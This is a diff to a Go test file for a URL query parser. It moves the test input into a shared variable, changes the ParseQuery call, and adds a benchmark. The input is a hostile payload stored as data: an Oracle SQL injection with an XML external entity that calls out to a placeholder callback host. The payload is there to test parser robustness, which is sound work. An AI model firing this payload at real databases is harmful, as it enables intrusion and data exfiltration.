--- a/internal/url/url_test.go
+++ b/internal/url/url_test.go
@@ -7,11 +7,18 @@ import (
 	"testing"
 )
 
+var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
+
 func TestUrlPayloads(t *testing.T) {
-	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
-	q := ParseQuery(out, '&', true)
+	q := ParseQuery(parseQueryInput, '&')
 	if len(q["var"]) == 0 {
 		t.Error("var is empty")
+	}
+}
+
+func BenchmarkParseQuery(b *testing.B) {
+	for i := 0; i < b.N; i++ {
+		ParseQuery(parseQueryInput, '&')
 	}
 }